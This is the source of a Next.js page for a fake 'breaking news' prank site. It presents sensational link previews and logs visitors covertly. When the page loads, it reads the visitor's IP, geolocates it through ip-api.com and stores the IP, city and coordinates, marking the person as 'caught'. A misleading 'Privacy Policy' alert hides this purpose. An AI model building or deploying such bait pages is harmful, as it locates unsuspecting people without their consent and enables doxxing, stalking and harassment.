export const dynamic = 'force-dynamic';

import { supabase } from '@/lib/supabase';
import { Metadata } from 'next';
import { headers } from 'next/headers';

type Props = {
  params: Promise<{ id: string }>;
};

// 🔴 지피티가 준 메타데이터 로직 (그대로 유지)
export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { id } = await params;

  const { data: post } = await supabase
    .from('news_posts')
    .select('*')
    .eq('id', id)
    .single();

  if (!post) {
    return {
      title: "Noticiario Bromas MX",
      description: "Breaking News!",
    };
  }

  const title = `[BREAKING] ${post.title}`;
  const description = "Breaking News! Something shocking just happened!";
  const image = post.image_url;

  return {
    title,
    description,
    openGraph: {
      title,
      description,
      url: `https://latam-en-vivo.online/news/${id}`, // 사장님 도메인으로 넣었습니다
      siteName: "Noticiario Bromas MX",
      images: [
        {
          url: image,
          width: 800,
          height: 600,
        },
      ],
      type: "article",
    },
    twitter: {
      card: "summary_large_image",
      title,
      description,
      images: [image],
    },
  };
}

export default async function NewsDetailPage({ params }: Props) {
  const { id } = await params;

  // 🔴 검거 로직 (IP 및 위치 추적)
  let ip = 'Unknown';
  try {
    const headerList = await headers();
    ip = headerList.get('x-forwarded-for')?.split(',')[0] || 'Unknown';

    if (ip !== 'Unknown') {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geo = await geoRes.json();
      
      if (geo.status === 'success') {
        await supabase.from('news_posts').update({
          ip: ip,
          country: geo.country,
          city: geo.city,
          lat: geo.lat.toString(),
          lon: geo.lon.toString(),
          is_caught: true
        }).eq('id', id);
      }
    }
  } catch (e) {
    console.error("Tracing error:", e);
  }

  const { data: post } = await supabase.from('news_posts').select('*').eq('id', id).single();
  
  if (!post) return <div className="p-10 text-center font-black">Noticia no encontrada.</div>;

  return (
    <main className="min-h-screen bg-white text-black font-sans">
      {/* 긴급 속보 헤더 */}
      <div className="bg-red-600 text-white p-3 text-center font-black italic shadow-lg uppercase tracking-tighter">
        NOTICIARIO BROMAS MX - ÚLTIMO MOMENTO
      </div>

      <div className="max-w-2xl mx-auto p-5 py-10">
        <div className="inline-block bg-black text-white text-[10px] font-bold px-2 py-1 mb-4 uppercase tracking-widest">
          EXCLUSIVA MUNDIAL
        </div>
        
        <h1 className="text-3xl md:text-5xl font-black leading-[1.1] mb-8 tracking-tight">
          {post.title}
        </h1>

        <div className="relative mb-10 group">
          <img 
            src={post.image_url} 
            alt="Noticia" 
            className="w-full h-auto shadow-2xl border border-gray-100 rounded-sm" 
          />
          <div className="absolute bottom-0 left-0 bg-red-600 text-white text-[10px] font-bold px-2 py-1">
            IMÁGENES EXCLUSIVAS
          </div>
        </div>

        <div className="space-y-6 text-gray-800 leading-relaxed text-lg border-t-4 border-black pt-8">
          <p className="font-bold text-red-700 underline decoration-red-200 decoration-4 underline-offset-4 text-left font-black text-xl">
             news is fake!:
          </p>
          <p className="text-left font-black text-2xl">
             you are idiot! 🤣
          </p>
          
          <div className="py-20 text-center">
            <div className="inline-block w-8 h-8 border-4 border-gray-200 border-t-red-600 rounded-full animate-spin mb-4"></div>
            <p className="text-gray-400 italic text-sm animate-pulse">
              Cargando más información de última hora...
            </p>
          </div>
        </div>

        {/* 🔴 이미지 요청 스타일 정책 고지 */}
        <div className="mt-20 text-center px-4 border-t border-gray-100 pt-10 pb-10">
          <p className="text-[11px] text-gray-400 leading-normal">
            By interacting with this content, you agree to the <br />
            <button 
              type="button"
              className="underline font-medium hover:text-black transition"
              onClickCapture={() => alert("TÉRMINOS: Este sitio es para fines de entretenimiento. Se recopilan datos técnicos para prevenir el fraude.")}
            >
              Terms of Use
            </button> & <button 
              type="button"
              className="underline font-medium hover:text-black transition"
              onClickCapture={() => alert("PRIVACIDAD: Los datos de acceso se registran automáticamente para auditoría de seguridad.")}
            >
              Privacy Policy
            </button>.
          </p>
          <p className="text-[9px] text-gray-300 mt-4 uppercase">© 2026 Noticiario Bromas MX</p>
        </div>
      </div>
    </main>
  );
}